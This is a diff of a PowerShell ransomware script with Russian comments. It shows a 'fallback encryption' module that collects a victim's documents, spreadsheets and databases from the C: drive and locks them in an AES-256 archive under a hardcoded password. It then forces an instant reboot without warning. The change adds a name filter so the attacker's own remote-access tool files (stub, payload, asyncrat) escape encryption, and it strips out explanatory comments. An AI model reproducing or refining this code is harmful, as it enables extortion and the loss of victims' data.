@@ -213,14 +213,14 @@ if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
     # --- Fallback: архивное шифрование ---
     Write-Host "BitLocker недоступен. Запуск архивного шифрования..." -ForegroundColor Orange
     
-        # ============================================
-    # МОДУЛЬ 9b: FALLBACK-ШИФРОВАНИЕ (если BitLocker не сработал)
+    # ============================================
+    # МОДУЛЬ 9b: FALLBACK-ШИФРОВАНИЕ
     # ============================================
     
     $Password = "YHsgh273h*jY632H23##h#^y7h#^#@#h@"
     $ArchivePath = "$env:USERPROFILE\Desktop\encrypted_archive.zip"
     $DriveToScan = "C:"
-    $MaxFileSizeMB = 50  # Не трогаем файлы больше 50 МБ (чтобы архив не раздуло)
+    $MaxFileSizeMB = 50
     
     # Папки, которые НЕ трогаем
     $ExcludeDirs = @(
@@ -228,12 +228,12 @@ if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
         "\Program Files\",
         "\Program Files (x86)\",
         "\ProgramData\Microsoft\",
-        "\$Recycle.Bin\",
+        "\`$Recycle.Bin\",
         "\System Volume Information\",
         "\Recovery\"
     )
     
-    # Расширения файлов, которые шифруем (документы, фото, видео, базы данных)
+    # Расширения файлов, которые шифруем
     $TargetExtensions = @(
         ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
         ".txt", ".rtf", ".csv", ".mdb", ".accdb", ".one", ".odt", ".ods",
@@ -261,8 +261,19 @@ if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
             }
         }
         
+        # Исключения по имени файла (защищаем ратку)
+        $ExcludeFileNames = @("stub", "client", "payload", "rat", "asyncrat", "server")
+        $FileNameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($FullPath).ToLower()
+        $ExcludedByName = $false
+        foreach ($ExName in $ExcludeFileNames) {
+            if ($FileNameWithoutExt.Contains($ExName)) {
+                $ExcludedByName = $true
+                break
+            }
+        }
+        
         # Проверяем расширение и размер
-        if (-not $Excluded -and ($TargetExtensions -contains $Ext) -and ($_.Length -lt ($MaxFileSizeMB * 1MB))) {
+        if (-not $Excluded -and -not $ExcludedByName -and ($TargetExtensions -contains $Ext) -and ($_.Length -lt ($MaxFileSizeMB * 1MB))) {
             $FilesToEncrypt += $FullPath
         }
     }
@@ -278,27 +289,20 @@ if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
     # 2. Создаём защищённый паролем ZIP-архив
     Write-Host "[Fallback] Создаю зашифрованный архив: $ArchivePath" -ForegroundColor Cyan
     
-    # Используем 7-Zip, если установлен
     $SevenZip = "C:\Program Files\7-Zip\7z.exe"
-    $UseNativeZip = $false
     
     if (Test-Path $SevenZip) {
-        # 7-Zip с паролем и шифрованием AES-256
         $FileList = $FilesToEncrypt -join "`n"
         $TempList = "$env:TEMP\files_to_encrypt.txt"
         $FileList | Out-File -FilePath $TempList -Encoding UTF8
-        
         & $SevenZip a -tzip -mem=AES256 -p"$Password" -spf -scsUTF-8 @"$ArchivePath" @"$TempList"
         Remove-Item $TempList -Force
     } else {
-        # Fallback на встроенный Compress-Archive (без пароля — добавим пароль через .NET)
         Write-Host "[Fallback] 7-Zip не найден. Использую встроенный метод + пароль через .NET..." -ForegroundColor Yellow
         
-        # Создаём временный незащищённый архив
         $TempArchive = "$env:TEMP\temp_archive.zip"
         Compress-Archive -Path $FilesToEncrypt -DestinationPath $TempArchive -CompressionLevel Optimal -Force
         
-        # Шифруем архив паролем через .NET
         $zipBytes = [System.IO.File]::ReadAllBytes($TempArchive)
         $aes = [System.Security.Cryptography.Aes]::Create()
         $aes.KeySize = 256
@@ -312,11 +316,9 @@ if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
         $encryptor = $aes.CreateEncryptor()
         $encryptedData = $encryptor.TransformFinalBlock($zipBytes, 0, $zipBytes.Length)
         
-        # Сохраняем IV + Salt + Данные в финальный файл
         $FinalData = $aes.IV + $salt + $encryptedData
         [System.IO.File]::WriteAllBytes($ArchivePath, $FinalData)
         Remove-Item $TempArchive -Force
-        $UseNativeZip = $true
     }
     
     Write-Host "[Fallback] Архив создан и зашифрован." -ForegroundColor Green
@@ -338,12 +340,8 @@ if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
 }
 
 # ============================================
-# ФИНАЛ: ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА ДЛЯ ШИФРОВАНИЯ
+# ФИНАЛ: ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА
 # ============================================
 Write-Host "`nВсе модули запущены. Перезагрузка для применения BitLocker..." -ForegroundColor Green
-
-# Даем 5 секунд мониторам запуститься перед перезагрузкой
 Start-Sleep -Seconds 5
-
-# Принудительная перезагрузка без предупреждения
 shutdown /r /f /t 0
